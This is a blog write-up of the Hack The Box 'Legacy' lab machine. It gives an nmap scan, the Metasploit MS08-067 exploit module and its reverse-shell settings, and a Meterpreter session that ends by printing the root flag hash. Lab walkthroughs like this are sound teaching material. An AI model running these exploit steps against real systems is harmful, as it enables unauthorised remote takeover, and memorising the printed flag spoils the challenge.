+++
title = "HTB - Legacy"
date = 2024-10-28
+++

<img alt="Image" async src="images/Legacy.png" width="800px"></img>

Legacy is a very easy machine emphasizing the importance of keeping an OS up to date.
### Service Enumeration
Our script: `nmap -sV -sC --open -p- 10.10.10.4`

Our scan:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-02 21:28 EDT
Nmap scan report for 10.10.10.4
Host is up (0.14s latency).
Not shown: 65531 closed tcp ports (reset), 1 filtered tcp port (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:94:2f:34 (VMware)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2024-09-08T06:27:05+03:00
|_clock-skew: mean: 5d00h27m39s, deviation: 2h07m16s, median: 4d22h57m39s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 63.25 seconds

```

We gather a hostname and see we're running Windows XP 2000. Upon research, we learn about a remote code execution vulnerability disclosed in 2008, MS08-067.

### Initial Access
We can search metasploit for our module, using `search MS08_067`. We'll see the only valid option being listed as the first. We'll equip the exploit: `use exploit/windows/smb/ms08_067_netapi`, and we'll set our parameters for the attack.

```
RHOSTS: 10.10.10.4
RPORT: 445
LHOST: 10.0.2.15
LPORT: 4444
```

Now, we'll execute.

<img alt="Image" async src="images/Screenshot 2024-09-02 at 9.54.17 PM.png" width="800px"></img>

### Post Exploitation

Once in, we can root around. I've included the entire code block below to show the raw data!

```bash
meterpreter > cd ../
meterpreter > ls
Listing: C:\
============

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
100777/rwxrwxrwx  0       fil   2017-03-16 01:30:44 -0400  AUTOEXEC.BAT
100666/rw-rw-rw-  0       fil   2017-03-16 01:30:44 -0400  CONFIG.SYS
040777/rwxrwxrwx  0       dir   2017-03-16 02:07:20 -0400  Documents and Settings
100444/r--r--r--  0       fil   2017-03-16 01:30:44 -0400  IO.SYS
100444/r--r--r--  0       fil   2017-03-16 01:30:44 -0400  MSDOS.SYS
100555/r-xr-xr-x  47564   fil   2008-04-13 16:13:04 -0400  NTDETECT.COM
040555/r-xr-xr-x  0       dir   2017-12-29 15:41:18 -0500  Program Files
040777/rwxrwxrwx  0       dir   2017-03-16 01:32:59 -0400  System Volume Information
040777/rwxrwxrwx  0       dir   2022-05-18 08:10:06 -0400  WINDOWS
100666/rw-rw-rw-  211     fil   2017-03-16 01:26:58 -0400  boot.ini
100444/r--r--r--  250048  fil   2008-04-13 18:01:44 -0400  ntldr
000000/---------  0       fif   1969-12-31 19:00:00 -0500  pagefile.sys

meterpreter > cd Documents\ and\ Settings\\
meterpreter > ls
Listing: C:\Documents and Settings
==================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  0     dir   2017-03-16 02:07:21 -0400  Administrator
040777/rwxrwxrwx  0     dir   2017-03-16 01:29:48 -0400  All Users
040777/rwxrwxrwx  0     dir   2017-03-16 01:33:37 -0400  Default User
040777/rwxrwxrwx  0     dir   2017-03-16 01:32:52 -0400  LocalService
040777/rwxrwxrwx  0     dir   2017-03-16 01:32:43 -0400  NetworkService
040777/rwxrwxrwx  0     dir   2017-03-16 01:33:42 -0400  john

meterpreter > cd Administrator\\
meterpreter > ls
Listing: C:\Documents and Settings\Administrator
================================================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
040555/r-xr-xr-x  0       dir   2017-03-16 02:07:29 -0400  Application Data
040777/rwxrwxrwx  0       dir   2017-03-16 01:32:27 -0400  Cookies
040777/rwxrwxrwx  0       dir   2017-03-16 02:18:27 -0400  Desktop
040555/r-xr-xr-x  0       dir   2017-03-16 02:07:32 -0400  Favorites
040777/rwxrwxrwx  0       dir   2017-03-16 01:20:48 -0400  Local Settings
040555/r-xr-xr-x  0       dir   2017-03-16 02:07:31 -0400  My Documents
100666/rw-rw-rw-  786432  fil   2022-05-28 06:28:03 -0400  NTUSER.DAT
100666/rw-rw-rw-  1024    fil   2024-09-07 23:51:00 -0400  NTUSER.DAT.LOG
040777/rwxrwxrwx  0       dir   2017-03-16 01:20:48 -0400  NetHood
040777/rwxrwxrwx  0       dir   2017-03-16 01:20:48 -0400  PrintHood
040555/r-xr-xr-x  0       dir   2017-03-16 02:07:31 -0400  Recent
040555/r-xr-xr-x  0       dir   2017-03-16 02:07:24 -0400  SendTo
040555/r-xr-xr-x  0       dir   2017-03-16 01:20:48 -0400  Start Menu
040777/rwxrwxrwx  0       dir   2017-03-16 01:28:41 -0400  Templates
100666/rw-rw-rw-  178     fil   2022-05-28 06:28:03 -0400  ntuser.ini

meterpreter > cd Desktop\\
meterpreter > ls
Listing: C:\Documents and Settings\Administrator\Desktop
========================================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100444/r--r--r--  32    fil   2017-03-16 02:18:50 -0400  root.txt

meterpreter > cat root.txt 
993442d258b0e0ec917cae9e695d5713
```
#easy #windows #msfconsole 